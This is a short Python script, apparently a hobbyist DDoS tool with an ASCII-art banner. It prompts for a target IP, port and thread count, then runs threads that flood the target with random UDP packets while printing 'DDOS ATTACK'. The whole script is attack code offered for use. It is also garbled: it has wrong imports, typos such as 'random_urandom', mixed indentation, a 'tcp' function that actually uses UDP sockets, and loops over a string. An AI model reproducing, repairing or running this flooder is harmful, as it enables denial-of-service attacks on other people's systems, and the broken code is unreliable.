import random
import socket
import threads
import os,sys

os,system("clear")
print(""" 
██╗░░██╗██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
╚██╗██╔╝██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
░╚███╔╝░██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
░██╔██╗░██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██╔╝╚██╗██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░ """)

ip = str(input("IP:"))
port = int(input("PORT:"))
method = str(input("UDP/TCP:"))
time = int(input("PACKET"))
threads = int(input("THREADS"))

def udp():
	data = random._urandom (811)
	while True:
		try:
			 s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.sendto(data)
			for x in range(method):
                s.sendto(data)
            print("DDOS ATTACK")
        except:
            print("PAKE ANTI DDOS DONG")
            
def tcp():
	data = random_urandom (3019)
	while True:
		try:
			 s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.sendto(data)
			for x in range (method):
				s.sendto(data)
			print("DDOS ATTACK")
		except:
			print("PAKE ANTI DDOS DONG")
			
for y in range(time):
    th = threading.Thread(target=udp)
    th.start()
    th = threading.Thread(target=tcp)
    th.start()
